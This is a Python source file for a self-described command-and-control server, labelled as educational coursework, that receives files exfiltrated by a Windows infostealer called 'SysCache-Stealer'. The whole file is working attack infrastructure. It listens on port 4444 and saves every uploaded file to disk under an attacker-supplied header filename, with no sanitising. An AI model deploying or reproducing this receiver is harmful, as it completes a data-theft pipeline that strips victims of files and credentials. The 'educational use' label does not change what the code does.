#!/usr/bin/env python3
# ============================================================
# KALI C2 SERVER - HTTP FILE RECEIVER
# For use with SysCache-Stealer (Windows Payload)
# Educational use only - ITS Angelo Rizzoli
# ============================================================

from http.server import SimpleHTTPRequestHandler, HTTPServer
import os
import datetime

HOST = '0.0.0.0'
PORT = 4444
UPLOAD_DIR = "received_data"


class UploadHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if not os.path.exists(UPLOAD_DIR):
            os.makedirs(UPLOAD_DIR)

        filename = self.headers.get('X-Filename', 'unknown_file')
        content_length = int(self.headers.get('Content-Length', 0))

        if content_length > 0:
            file_data = self.rfile.read(content_length)
            filepath = os.path.join(UPLOAD_DIR, filename)
            with open(filepath, 'wb') as f:
                f.write(file_data)

            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{timestamp}] [+] Received file: {filename} ({content_length} bytes)")
        else:
            print(f"[-] Received empty request from {self.client_address[0]}")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"File uploaded successfully.")


if __name__ == '__main__':
    server_address = (HOST, PORT)
    httpd = HTTPServer(server_address, UploadHandler)
    print(f"[*] C2 Server started on {HOST}:{PORT}")
    print(f"[*] Saving received files to: ./{UPLOAD_DIR}/")
    print("[*] Waiting for incoming connections...")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server shutting down.")
